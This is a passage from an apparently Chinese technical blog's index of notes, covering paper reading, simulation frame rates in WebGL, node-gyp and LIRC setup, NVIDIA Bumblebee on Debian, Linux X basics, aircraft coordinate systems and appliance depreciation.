    <title><![CDATA[科学研究中阅读论文的方法]]></title>
    <url>%2F2018%2F12%2F20%2F%E7%A7%91%E5%AD%A6%E7%A0%94%E7%A9%B6%E4%B8%AD%E9%98%85%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在科学研究的过程中，选题十分重要。因此在初步确定好选题方向后，应对该选题方向进行调研。调研的主要工作就是寻找该方向的论文，进行阅读、分析、总结，了解该方向的过去和现在，并预测未来可能的发展方向。对于刚上研究生的同学，该采用什么样的方法来整理选题方向上的论文，使之符合逻辑，并且条理清晰呢？偶尔拜读了Flood Sung写的文章”深度学习论文阅读路线图“，觉得深受启发，将其所提出的深度学习论文阅读路线图构建原则记录备忘一下。 路线图的构建原则有以下四个原则： 从整体到局部。即从Survey的文章，影响大局的文章到具体子问题子领域的文章。 从过去到最前沿。即每个topic的文章是按照时间顺序排列的，这样大家就可以清楚的看到这个方向的研究发展脉络。 从通用到应用。即有些深度学习的文章是面向深度学习通用理论，比如Resnet，可以用在任意的神经网络中，而有些文章则是具体应用，比如Image Caption。 面向最前沿。收集的文章会有很多是最新的，甚至就是几天前出来的，这样能保证路线图是最新的。 每一种topic只选择最有代表性的几篇文章，比如深度增强学习（Deep Reinforcement Learning），这个领域现在有几十篇文章，但只选择几篇，要深入了解甚至做为自己的研究方向，还需要进一步的阅读该领域的文章。 参考链接 深度学习论文阅读路线图 Deep Learning Papers Reading Roadmap,by Flood Sung. Deep Learning Papers Reading Roadmap,by Flood Sung.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统仿真中一些问题的思考]]></title>
    <url>%2F2018%2F12%2F18%2F%E7%B3%BB%E7%BB%9F%E4%BB%BF%E7%9C%9F%E4%B8%AD%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[系统仿真（system simulation）就是根据系统分析的目的，在分析系统各要素性质及其相互关系的基础上，建立能描述系统结构或行为过程的、且具有一定逻辑关系或数量关系的仿真模型，据此进行试验或定量分析，以获得正确决策所需的各种信息。 系统仿真与仿真游戏的区别系统仿真与仿真游戏本质上没有区别，都是计算机程序对现实的模拟，所不同的是各自对仿真保真度（Simulation Fidelity）的要求不同。 仿真保真度（Simulation Fidelity）用于描述仿真精度，模拟真实对应物有多近似： 低保真：对系统的最小模拟，接受输入产生输出 中等保真：对刺激能自动响应，有限精度 高保真：接近不可辨识或者尽可能地接近真实系统 通常系统仿真对仿真保真度的要求比仿真游戏要高。 计算步长与采样周期采用计算机进行数值模拟或系统仿真时，经常需要采用数值解法求解模型方程。系统模型一般采用微分方程描述（也有其它形式），采用数值方法求解，就是采用迭代法逐步逼近。 计算步长积分与微分是互逆。对一个曲线（包括直线）方程求积分，其实就是求曲线与横轴围成的面积。该面积可以用一系列间隔很小的面积块相加得到。这些小间隔的宽度就是计算步长。显然，纯粹从精度的角度考虑，步长越小越精确，因为近似面积更接近实际图形面积。 采样周期采样周期是对一个实际信号测量时，相邻两次测量之间的时间间隔。有时候，采样周期和计算步长相似，但采样周期要考虑实际限制，且是时间单位，而计算步长不一定是时间单位，且相对自由些。两者在数值上没必然联系。对于同一问题，且都是时间量纲的话，采样周期大于等于计算步长，前者是后者的整数倍。 系统仿真包含系统模型求解，也就是在每个采样周期内，要解出模型方程。控制系统仿真时在采样周期内要解出两个模型方程：控制器模型和系统模型。 一个采样周期内可对系统模型迭代求解一次或多次。 计算步长和采样周期大小的选择关于采样周期和计算步长的选择，一般考虑以下因素： 从求解精度考虑，越小越好。 从计算量考虑，越大越好。 采样周期与每秒帧数(Frames Per Second，FPS)采样周期以秒为单位，则 FPS=\frac{1}{采样周期}FPS是指每秒画面重绘的次数，用于衡量画面切换速度。FPS越大，则动画效果越平滑，当FPS小于20时，一般就能明显感受到画面的卡滞现象。 当FPS足够大(比如达到60)，再增加帧数人眼也不会感受到明显的变化，反而相应地就要消耗更多资源(比如电影的胶片就需要更长了，或是电脑刷新画面需要消耗计算资源等等)。因此，选择一个适中的FPS即可。 NTSC标准的电视FPS是30，PAL标准的电视FPS是25，电影的FPS标准为24。 WebGL动画WebGL是一种JavaScript API，用于在不使用插件的情况下在任何兼容的网页浏览器中呈现交互式2D和3D图形。但要产生WebGL动画，需要对运动的场景不停的采样，即不停地拍照。JavaScript的采样函数主要有setInterval方法和requestAnimationFrame方法。 setInterval方法 如果要设置特定的FPS(虽然严格来说，即使使用这种方法，JavaScript也不能保证帧数精确性)，可以使用JavaScript DOM定义的方法： 1setInterval(fn,mesc) 其中，fn是每过msec毫秒执行的函数，如果将fn定义为重绘画面的函数，就能实现动画效果。setInterval函数返回一个变量timer，如果需要停止重绘，需要使用clearInterval方法，并传入该变量timer。 requestAnimationFrame方法 大多数时候，我们并不在意多久重绘一次，这时候就适合用requestAnimationFrame方法了。它告诉浏览器在合适的时候调用指定函数，通常可能达到60FPS。 requestAnimationFrame同样有对应的cancelAnimationFrame取消动画 和setInterval不同的是，由于requestAnimationFrame只请求一帧画面，因此，除了在init函数中需要调用，在被其调用的函数中需要再次调用requestAnimationFrame 使用stat.js记录FPSstat.js是Three.js的作者Mr.Doob的另一个有用的JavaScript库。很多情况下，我们希望知道实时的FPS信息，从而更好地监测动画效果。这时候，stat.js就能提供一个很好的帮助，它占据屏幕中的一小块位置(如左上角)，显示实时的FPS信息。 在HTML中引用stat.js:1&lt;script type=&quot;text/javascript&quot; src=&quot;//mrdoob.github.io/stats.js/build/stats.min.js&quot;&gt;&lt;/script&gt; 再使用如下代码监视实时FPS：1234567891011121314151617var stats = new Stats();stats.showPanel( 1 ); // 0: fps, 1: ms, 2: mb, 3+: customdocument.body.appendChild( stats.dom );function animate() &#123; stats.begin(); // monitored code goes here stats.end(); requestAnimationFrame( animate );&#125;requestAnimationFrame( animate ); 参考链接 计算步长和采样周期,by 王永林. 离散和连续模拟之间的实际区别是什么？,by UF Game. 系统仿真,by 百度百科. 开源的物理引擎,by M. Jones. 数值分析,by wikipedia. three.js 入门详解(二),by Levi. WebGL,by wikipedia. stats.js, by mydoob. 详解JavaScript中的Event Loop（事件循环）机制,by 暮雨清秋.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
        <tag>WebGL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[撰写学术论文的思考]]></title>
    <url>%2F2018%2F12%2F17%2F%E6%92%B0%E5%86%99%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[迫于学业和工作的压力，撰写了不少的学术论文。但是并没有对如何撰写学术论文进行思考。看到清华大学的肖寒博士在某个问题下的回答后，感觉茅塞顿开： 不过，一般注水的作者相对而言都是新手，因为比较有经验的研究者都知道：“论文的一切都在于贡献，不在于结果” 你的结果只是一个说明你贡献的例证，多那么点少那么点，大家看了毫无区别。你注水除了恶心我们这些后来实验的人，就没什么别的用处了。有那些疯狂调参和使劲弄技巧的时间，真不如拿来整理好你自己的思路，把论文的论述过程做到有理有据！因为 80.2 和 80.3 正常人都没法记住其间区别，但你循循善诱的精致论述会让所有人印象深刻。我希望新手不要本末倒置！ 论文重在贡献，迫于学业和工作的压力造的注水论文实在无趣！ 参考链接 看图说话的AI小朋友——图像标注趣谈（下）, by 杜客. 从标题到写作流程：写好一篇论文的十条基本原则,by 机器之心.]]></content>
      <tags>
        <tag>科研</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node-gyp使用帮助]]></title>
    <url>%2F2018%2F12%2F16%2Fnode-gyp%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9%2F</url>
    <content type="text"><![CDATA[node-gyp是为了编译nodejs addon模块而构建的跨平台命令行工具。nodejs addon模块使用c++语言编写，在源代码级别进行分发，通过node-gyp实现跨平台的编译安装。 背景知识node-gyp源于gyp。gyp是一个用来生成项目文件的工具，刚开始设计给chromium项目使用的。它可以从平台无关的配置生成平台相关的Visual Studio、Xcode、Makefile的项目文件，然后调用 vsbuild、xcode、gcc等编译平台来编译。这就不需要花额外的时间处理每个平台不同的项目配置以及项目之间的依赖关系。 nodejs addon模块采用源代码分发，安装需要根据不同平台采用合适的编译器编译安装，这就是node-gyp项目诞生的原由。 安装过程安装node-gyp在上线情况下，使用如下命令安装node-gyp：1$ npm install -g node-gyp 安装C++编译器根据操作系统平台的不同，需安装对应的编译器，以方便node-gyp调用。以Windows平台为例，安装VC++编译器有两种方法： 直接安装 123# 以管理员身份打开cmd或powershellnpm install --global --production windows-build-tools 手动安装 安装Visual C++构建环境： 使用Visual Studio Build Tools的Visual C++ build tools工作负载或者Visual Studio 2017 Community的Desktop development with C++工作负载。 安装Python 2.7，不支持python3，然后运行npm config set python python2.7 在cmd中运行npm config set msvs_version 2017 手动安装Visual C++构建环境的命令如下：1234567# 使用Visual Studio Build Tools的Visual C++ build tools工作负载，确保安装win10sdk，编译nodejs源码时需要.\vs_buildtools__2041717674.1536666005.exe --layout d:\vc2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.MSBuildTools --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended# 使用Visual Studio 2017 Community的Desktop development with C++工作负载.\vs_community__208176120.1522073957.exe --layout e:\vs2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.CoreEditor --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended node-gyp编译测试以在Win10平台编译nodejs addon模块为例，在离线情况使用如下命令测试node-gyp是否工作正常：123node-gyp configure --nodedir=d:\node-v8.11.3node-gyp build 参考链接 node-gyp的作用是什么?,by zhihu. node-gyp, by nodejs Windows-Build-Tools, by felixrieseberg.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派使用lirc进行红外遥控测试]]></title>
    <url>%2F2018%2F12%2F15%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8lirc%E8%BF%9B%E8%A1%8C%E7%BA%A2%E5%A4%96%E9%81%A5%E6%8E%A7%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[在树莓派上使用lirc进行红外遥控测试的步骤比较繁琐，记录一下以备忘。 背景知识lirc库LIRC (Linux Infrared remote control,Linux红外线遥控)是一个开放源代码的包。这个包可以让你的Linux系统能够接收及发送红外线信号。 Microsoft Windows上有个功能相同的软件叫WinLIRC。 利用LIRC和红外线接收器，你就几乎可以用所有的红外线遥控器（例如：电视遥控器）来控制你的计算机。举例来说，你可以用遥控器来控制DVD或音乐的播放。 lirc配置文件说明 /etc/lirc/lircd.conf为遥控器配置文件 /etc/lirc/lircmd.conf为lircmd配置文件，后者可以将遥控器用作鼠标。 /etc/lirc/lircrc为irexec配置文件，后者可以在收到遥控器信号号运行设定的程序。 制作遥控器配置文件使用irrecord命令制作遥控器配置文件lircd.conf。12345# 首先停止lirc服务sudo service lirc stop# 制作遥控器配置文件irrecord -d /dev/lirc0 &lt;model&gt;.conf 测试过程硬件 树莓派3B+ 红外接收器 红外遥控器 杜邦线 接线红外接收器都有三个引脚：VCC、GND、Data。其中：VCC：连接5V的引脚GND：连接接地的引脚Data：连接GPIO23 lirc配置 安装lirc: 1sudo apt-get install lirc -y 修改/etc/modules 123456789# /etc/modules: kernel modules to load at boot time.## This file contains the names of kernel modules that should be loaded# at boot time, one per line. Lines beginning with &quot;#&quot; are ignored.i2c-dev# 添加如下代码lirc_devlirc_rpi gpio_in_pin=23 gpio_out_pin=22 修改/etc/lirc/lirc_options.conf 123# 修改如下两项driver = default device = /dev/lirc0 修改/boot/config.txt在/boot/config.txt文件中找到#dtoverlay=lirc-rpi，将其修改如下： 1dtoverlay=lirc-rpi:gpio_in_pin=23,gpio_out_pin=22 重启测试 1234sudo init 6# 查看lirc是否加载成功lsmod | grep lircls /dev/lirc0 参考链接 LIRC,by wikipedia. 树莓派—-红外遥控设置,by 逍遥游. 配置树莓派上的lirc(Raspbian, 2016) ,by Cnly.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[飞行力学中坐标系定义]]></title>
    <url>%2F2018%2F12%2F10%2F%E9%A3%9E%E8%A1%8C%E5%8A%9B%E5%AD%A6%E4%B8%AD%E5%9D%90%E6%A0%87%E7%B3%BB%E5%AE%9A%E4%B9%89%2F</url>
    <content type="text"><![CDATA[建立飞机的运动学模型的前提是建立合适的坐标系，在此基础上才能定义各种参数描述飞机的状态。下面介绍常用的坐标系及常用描述飞机状态的参数。 常用坐标系地面固定坐标轴系($AX_gY_gZ_g$)将地球视为椭球体，则地面固定坐标轴系定义为： 以椭球面上一点为坐标系原点$A$，$Z_g$轴与椭球法线重合，向下为正，$X_g$与$Y_g$轴位于过坐标原地的椭球切平面上,按右手法则建立，$X_g$轴与椭球短半轴重合（北向），$Y_g$轴与地球椭球的长半轴重合（东向）。 在研究坐标转换关系时，常使用飞机牵连铅垂地面固定坐标系$OX_gY_gZ_g$。其原点$O$位于飞机质心，三坐标轴平行于地面固定坐标轴系$AX_gY_gZ_g$的各个轴。飞机姿态——偏航、俯仰、滚转的定义即与飞机牵连铅垂地面固定坐标系有关。 机体坐标系(体轴系$OXYZ$)机体坐标系定义为： 原点$O$位于质心，$O_X$平行于机身轴线或对称面机翼弦线指向前方（机头方向）；$O_Y$垂直于对称面指向右翼；$O_Z$在飞机对称面内，垂直于$O_X$指向下方。符合右手系建立规定。 图1 飞机牵连铅垂地面固定坐标系（OXgYgZg）与体轴系（OXYZ） 航迹坐标系($OX_kY_kZ_k$)航迹坐标系定义： 原点$O$位于飞机质心，$OX_k$沿飞机速度方向；$OZ_k$在$OX_k$所在铅垂平面内，垂直于$OX_k$指向下方；$OY_k$垂直于$OX_k$、$OZ_k$ 所在平面指向右方；符合右手系建立规定。 图2 航迹坐标系（OXkYkZk） 气流坐标轴系(风轴系$OX_aY_aZ_a$)气流坐标轴系又称速度坐标轴系，定义为： 原点$O$位于飞机质心，$OX_a$沿飞机速度方向；$OZ_a$在飞机对称面内，垂直于$OX_a$指向下方；$OY_a$垂直于$OX_a$、$OZ_a$ 所在平面指向右方；符合右手系建立规定。 气动力三个分量（升力、阻力、侧力）是根据风轴系定义的，其中升力与阻力分别沿$OZ_a$、$OX_a$的负向。 半机体坐标系($OX_iY_iZ_i$)半机体坐标系定义为： 原点$O$位于质心，$OX_i$沿飞机速度向飞机对称面内投影方向；$OZ_i$在飞机对称面内，垂直于$OX_i$指向下方；$OY_i$垂直于$OX_i$、$OZ_i$ 所在平面指向右方；符合右手系建立规定。 图3 风轴系（OXaYaZa）与半机体坐标系（OXiYiZi） 稳定性坐标系($OX_sY_sZ_s$)稳定性坐标系定义为： 原点$O$位于质心，$OX_s$沿未受扰动的速度在对称面内的投影方向；$OY_s$在飞机对称面内，指向右；$OZ_s$对称平面内垂直于$OX_s$向下；符合右手系建立规定。 图4 稳定性坐标系（OXsYsZs） 常用飞参 机体坐标系相对于飞机牵连铅垂地面固定坐标系的夹角 偏航角：机体坐标系$x$轴在水平面内投影与$x_g$的夹角，以$\psi$表示 俯仰角：机体坐标系$x$轴与水平面的夹角，以$\theta$表示 滚转角：过机体坐标系$x$轴的铅垂面与机体坐标系$z$轴的夹角，以$\phi$表示 飞行速度矢量相对于体轴系的夹角 迎角：速度矢量在飞机纵向对称面内投影与机体坐标系$x$轴夹角，以$\alpha$表示 侧滑角：速度矢量与飞机纵向对称面的夹角，以$\beta$表示 飞行速度矢量相对于地面的夹角 爬升角：速度与地面水平面夹角，以$\gamma$表示 航迹方位角：速度在地面水平面的投影与$x_g$夹角，以$\chi$表示 参考链接 无人机飞控通俗演义之 纷繁复杂的飞行力学, by 量子黑洞. 一起写飞行仿真之 六自由度动力学方程, by 量子黑洞. 飞行器飞行动力学（二）坐标系与夹角们, by 萝卜. Cesium中飞行器姿态控制,by jack huang. MathJax 支持的 Latex 符号总结(希腊字母和希伯来字母),by liyuanbhu 空间中三维矢量,by tina_ttl.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian系统安装NVIDIA驱动支持双显卡切换]]></title>
    <url>%2F2018%2F12%2F10%2FDebian%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85NVIDIA%E9%A9%B1%E5%8A%A8%E6%94%AF%E6%8C%81%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%88%87%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[购买笔记本拥有Intel集成显卡和NVIDIA显卡，如何在Debian Linux下启用NVIDIA显卡是一个难题。幸运的是，通过bumblebee软件可在Linux下支持NVIDIA Optimus技术，实现Intel集成显卡和NVIDIA显卡之间的切换使用。 背景知识NVIDIA OptimusOptimus是NVIDIA针对笔记本电脑的显示切换技术。它可以实现笔记本电脑中独立显卡与主板内置显卡之间无缝、自动、实时的切换（用户无需重启或手动调整），从而实现能源的节约。 利用Optimus技术后，计算机的显示输出永远都只会通过集成式芯片组的显示核心。独立显卡的显示输出将会被废掉，有关的输出亦会发送到前者。由于显示输出的设备是固定的，所以黑屏现象将会被解决。额外的切换线路亦变得不需要，因为在不需要独立显示核心的时候，系统会索性断绝其电源供应。当系统的显示负载轻的时候，就会完全利用内置的显示核心。当负载增加后，系统就会打开独立显示核心作计算之用。协议分工方面由驱动程序负责，NVIDIA声称可以兼容所有的API。 BumblebeeBumblebee 致力于使 NVIDIA Optimus 在 GNU/Linux 系统上可用，实现两块不同的供电配置的显卡同时插入使用，共享同一个 framebuffer。 安装配置过程禁止加载开源驱动nouveau12345678$ vi /etc/modprobe.d/nvidia-installer-disable-nouveau.conf#上述文件不存在则新建，在文件中添加下面两行文字blacklist nouveauoptions nouveau modeset = 0#系统重启后使用以下命令查看nouveau驱动是否被禁止lsmod |grep -i nouveau 安装内核头文件1$ sudo apt-get install -y linux-headers-$(uname -r) 安装NVIDIA驱动12# 关于是否生存xorg.conf文件，选no$ sudo apt-get install nvidia-driver nvidia-xconfig nvidia-kernel-dkms 安装双显卡切换解决方案包1$ apt-get install bumblebee-nvidia primus 添加当前用户到bumblebee用户组1$ adduser $USER bumblebee 修改bumblebee配置123456789101112$ vi /etc/bumeblebee/bumblebee.conf: Driver=nvidia#将/etc/bumeblebee/bumblebee.conf文件中的Driver=* 改成 =nvidia$ vi /etc/bumblebee/xorg.conf.nvidia:BusID &quot;PCI:01:00:0&quot; #在/etc/bumblebee/xorg.conf.nvidia文件中，将Section“Device”部分添加PCI ID# 可使用如下命令查看NVIDIA显卡的BUS IDnvidia-xconfig --query-gpu-info | grep &apos;BusID : &apos; | cut -d &apos; &apos; -f6 重启进入桌面如果无法进入桌面环境，则安装失败，进入高级修复使用如下命令进行清理。1$ sudo apt-get purge nvidia* bumblebee* prime* bumblebee服务开机不会启动，设置开机启动即可。1$ update-rc.d -f bumblebee defaults 使用独显运行程序bumblebee不能做到集显和独显之间自动切换，系统运行时默认使用集显，当你需要使用独显运行某个程序或者游戏的时候，终端执行如下命令即可：12$ optirum command #使用独显运行command程序$ optirum -b primus command #使用独显运行command程序，提升性能 参考链接 kali 在支持双显卡切换机器宏碁（Acer）V3下安装NVIDIA驱动, by 不梦君. Installing-Nvidia-drivers-on-Kali-Linux, by europa502. NVIDIA Optimus, by wikipedia. 在Ubuntu上安装和配置Nvidia Optimus驱动, by Linux中国. Bumblebee),by archlinux.]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux图形界面基础知识]]></title>
    <url>%2F2018%2F12%2F09%2FLinux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Linux初学者经常分不清楚linux和X之间，X和Xfree86之间，X和KDE，GNOME等之间是什么关系。常常混淆概念，下面以易于理解的方式解释X，X11，XFREE，WM，KDE，GNOME等之间的关系。 Linux内核没有图形用户界面与Windows操作系统内核集成图形用户界面不同，Linux内核没有图形用户界面，是一个基于命令行的操作系统。 linux和Xfree的关系就相当于当年的DOS和 WINDOWS3.0一样，windows3.0不是独立的操作系统，它只是DOS的扩充，是DOS下的应用程序级别的系统，不是独立的操作系统，同样 XFree只是linux下的一个应用程序而已。不是系统的一部分，但是X的存在可以方便用户使用电脑。 WINDOWS95及以后的版本就不一样了，他们 的图形界面是操作系统的一部分，图形界面在系统内核中就实现了，没有了图形界面windows就不成为windows了，但linux却不一样，没有图形 界面linux还是linux，很多装linux的WEB服务器就根本不装X服务器.这也WINDOWS和linux的重要区别之一。 X是协议，不是具体的某个软件X 是协议，就像HTTP协议，IP协议一样。一个基于X的应用程序需要运行并显示内容时他就联 接到X服务器，开始用X协议和服务器交谈。 比如一个X应用程序要在屏幕上输出一个圆那么他就用X协议对X服务器说：喂!我需要在屏幕上画一个圆.X应用程 序只负责告诉X服务器在屏幕的什么地方用什么颜色画一个多大的圆，而具体的”画”的动作，比如这个圆如何生成，用什么显卡的驱动程序去指挥显卡完成等等工作是由X服务器来完成的。 X服务器还负责捕捉键盘和鼠标的动作，假设X服务器捕捉到鼠标的左键被按下了，他就告诉X应用程序：亲爱的应用程序先生，我发现 鼠标被按下了，您有什么指示吗?如果X应用程序被设计成当按下鼠标左健后再在屏幕上画一个正方形的话，X应用程序就对X服务器说：请再画一个正方形，当然 他会告诉服务器在什么地方用什么颜色画多大的正方形，但不关心具体怎么画—那是服务器的事情。 XFree86和Xorg是实现X协议的服务器程序Xfree86就是这样一个去根据法规实现协议的 “交警”。他按照X协议的规定来完成X应用程序提交的在屏幕上显示的任务。当然不仅仅是某个特定的交警才可以去维护和实现这个法规，比如还可以由交通协管 员来实现交通法规，必要的时候警察也可以介入，当然前提是他们都要懂得交通法规，也就是要懂得协议。 所以实现X协议的软件也并不只有 XFree86，XFree86只是实现X协议的一个免费X服务器软件.商业上常用MOTIF，现在还有XORG，还有很多很小的由爱好者写的小的X服务器软件。 X和X11R6的关系X11R6 实际上是 X Protocol version 11 Release 6(X协议第11版第六次发行)的意思，就是说目前用的X协议是第11版的，然后经过了6次小的修正。 不同版本的X协议是不能通信的。就象我们现在IPV4和IPV6不能通信一样，不过不用担心，现在的X服务器软件和X应用程序都遵循X11R6。 X服务器和WM(window manager 窗口管理器)的关系 窗口管理器是一种X应用程序，它负责窗口最大化，最小化，移动，关闭窗口等。这些不是X服务器负责完成的。 KDE和GNOMEKDE 和GNOME是LINUX里最常用的图形界面操作环境，他们不仅仅是一个窗口管理器那么简单， KDE是K Desktop Environment 的缩写。他不仅是一个窗口管理器，还有很多配套的应用软件和方便使用的桌面环境，比如任务栏，开始菜单，桌面图标等等。 GNOME是GNU Network Object Model Environment 的缩写。和KDE一样，也是一个功能强大的综合环境。 另外在其它UNIX系统中，常常使用CDE作为这样一个环境。 其它的小型窗口管理器有: window maker，after step，blackbox，fvwm，fvwm2，等等都是常用的优秀窗口管理器。 linux图形界面层次关系总结linux本身—&gt;X服务器&lt;-[通过X协议交谈]-&gt;窗口管理器(综合桌面环境)—&gt;X应用程序。 Xfree86服务器的实现包括两个部分，一部分是和显卡直接打交道的低层，一部分是和X应用程序打交道的上层。 上层负责接收应用程序的请求和鼠标 键盘的动作。而和显卡直接打交道的底层负责指挥显卡生成图形，其实就是显卡驱动。上层接收到应用程序的请求后，将请求内容做适当处理，然后交给显卡驱动来 指挥 显卡完成画图的动作。 另外，上层的捕捉键盘和鼠标动作的部分会向应用程序提供鼠标和键盘的状态信息，应用程序接收到这些信息后决定是否再有相应的动作。 参考链接 linux图形界面基本知识(X、X11、Xfree86、Xorg、GNOME、KDE), by huang_xw.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[家用电器安全使用年限与折旧]]></title>
    <url>%2F2018%2F12%2F08%2F%E5%AE%B6%E7%94%A8%E7%94%B5%E5%99%A8%E5%AE%89%E5%85%A8%E4%BD%BF%E7%94%A8%E5%B9%B4%E9%99%90%E4%B8%8E%E6%8A%98%E6%97%A7%2F</url>
    <content type="text"><![CDATA[家用电器都有一定的安全使用年限，超过安全使用年限，家用电器因产品老化将产生如下问题，造成安全隐患： 绝缘体老化，产生漏电，导致电磁污染 元器件技术指标严重下降，导致有害物质泄漏，耗电量增加 那么家用电器的安全使用年限是多少呢？购买二手家用电器时如何折旧呢？ 家用电器安全使用年限有关家电安全使用年限的标准通则早已出台，但是针对不同产品的具体年限细则却迟迟未发布。原因主要在于不同产品的使用年限评估难度较大，不同地区的使用差异性也较大，因此就目前而言国内尚无明确的家电使用年限方面的规定，国际通行年限可作参考： 电吹风：4年 电热毯：6年 电脑：6年 吸尘器：8年 煤气灶：8年 电热水器：8年 洗衣机：8年 电视：8-10年 空调：8-10年 微波炉：10年 电饭煲：10年 电风扇：10年 冰箱：12-16年 家用电器安全使用年限只是最高限定，如果在使用过程中不注意保养维护，也有可能缩减家用电器的使用寿命，这就要求用户在日常生活中需要注重维护保养，使家电处于良好的工作环境，确保家电安全“服役”。 家用电器老化特征家用电器也有各自的老化特征，当出现以下老化特征时，建议及时保养或更换： 空调：如果使用多年的空调开始出现制冷或制热变慢，噪音过大，在开机时会出现霉味且出风伴有灰尘，流出黑水，那么用户就应该考虑更换一台新空调。老旧空调此时不仅耗费更多电量，出风还会带有细菌污垢，影响身体健康。 冰箱：平时运行良好的冰箱开始出现制冷效果差，噪音过大，甚至发生轻微颤动时，说明已经老化。若继续使用，耗电量将会加大，食物的储鲜功能也会退化，有时还会出现冰箱制冷剂泄露，污染食材环境的问题。 洗衣机：洗衣机使用超龄的现象在用户中最为常见，判断它已经超龄的方式也最为简单。通常来说，洗衣机出现渗水、漏水、漏电，噪音过大，衣物清洗不净等问题都是达到使用年限的表现，严重时甚至会发生爆炸事件。 电视机：虽然各种类型的平板、投影仪的市场占有率越来越高，但电视机仍然是每个家庭不可或缺的电器之一。日常使用电视时，屏幕色彩暗淡，画面模糊抖动，除了要考虑电视自身质量问题，还要查看电视使用时长是否已经超出使用年限。超龄服役的电视机除了耗电量增加外，自燃或爆炸事故也时有发生。 热水器：热水器超出使用年限后，在运行时会出现异常声音，安全装置也会发生功能异常问题，再加上内胆中日积月累的杂质污垢，不仅会污染水质，还可能因漏电对人体造成伤害。除此之外，超龄热水器还易出现漏水、保温性差以及因内部电器元件老化导致的短路、冒烟等故障。 一旦发现家中电器存在以上类似的老化特征时，最好提前更换产品，以免带来严重后果。据媒体公开报道，每年我国因家电触电伤亡人数超过1000人，因家电引起的火灾损失更加惊人，而这其中最典型的原因就是家电超龄“使用”。 家用电器折旧家用电器折旧可简单按固定资产折旧方法中的直线法，根据家用电器安全使用年限逐年折旧。 固定资产折旧方法固定资产折旧方法（Fixed-assets Depreciation Method），指将应提折旧总额在固定资产各使用期间进行分配时所采用的具体计算方法。折旧是指固定资产由于使用而逐渐磨损所减少的那部分价值。 固定资产的损耗有两种： 有形损耗，也称作物质磨损，是由于使用而发生的机械磨损，以及由于自然力的作用所引起的自然损耗。 无形损耗，也称精神磨损，是指科学进步以及劳动生产率提高等原因而引起的固定资产价值的损失。 一般情况下，当计算固定资产折旧时，要同时考虑这两种损耗。 固定资产折旧方法可分为三类： 直线法直线法（straight-line method）根据固定资产在整个使用寿命中的磨损状态而确定的成本分配结构。直线法依据是，固定资产的使用强度比较平均，而且各期所取得的收入差距不大。在直线法下，折旧金额是时间的线性函数。 直线法折旧公式如下： 年折旧率 = （1 － 预计净残值率）÷ 预计使用寿命（年）× 100% 月折旧额 = 固定资产原价× 年折旧率 ÷ 12 其中，净残值是指预计固定资产清理报废时可收回的残值扣除清理费用后的数额。企业应根据固定资产的性质和使用方式，合理估计固定资产的净残值。 加速折旧法加速折旧法也称为快速折旧法或递减折旧法。其特点是：在固定资产有效使用年限的前期多提折旧，后期则少提折旧。从而相对加快折旧的速度，以使固定资产成本在有效使用年限中加快得到补偿。在具体实务中，加速折旧方法又包括年数总和法和双倍余额递减法两种。 年数总和法计算公式如下： 年折旧率 = 尚可使用寿命/ 预计使用寿命的年数总和 × 100 % 月折旧额 = （固定资产原价 － 预计净残值 ）× 年折旧率 ÷ 12 某设备预计使用5年，则预计使用寿命的年数总和为15（5+4+3+2+1）。第2年时尚可使用寿命为4，此年的年折旧率为4/15。 双倍余额递减法计算公式如下： 年折旧率 =2÷ 预计使用寿命（年）× 100% 月折旧额 = 固定资产净值 × 年折旧率 ÷ 12 产量法产量法（production method）根据固定资产的产出量分配其成本的方法。产量法的依据是固定资产的使用寿命主要是受其使用量影响，其合理性取决于三个条件： （1）固定资产的每期用量波动较大； （2）固定资产使用期内的产出的每期用量波动较大； （3）固定资产服务潜力的下降与其使用程序密切相关。 如果符合这三个条件，产量法是最符合配比原则的。反对产量法的人认为，估计固定资产的产出量比估计固定资产的使用年限更加困难，而且很难考虑功能损耗因素。 产量法计算公式如下： 单位工作量折旧额 = 固定资产原价 × （ 1 － 预计净残值率 ）/ 预计总工作量 某项固定资产月折旧额 = 该项固定资产当月工作量 × 单位工作量折旧额 参考链接 家用电器的使用年限是多久？如何尽可能延长其寿命？,by 海尔智慧生活. 固定资产折旧方法,by 百度百科.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>生活常识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[空战类游戏仿真的一些思考]]></title>
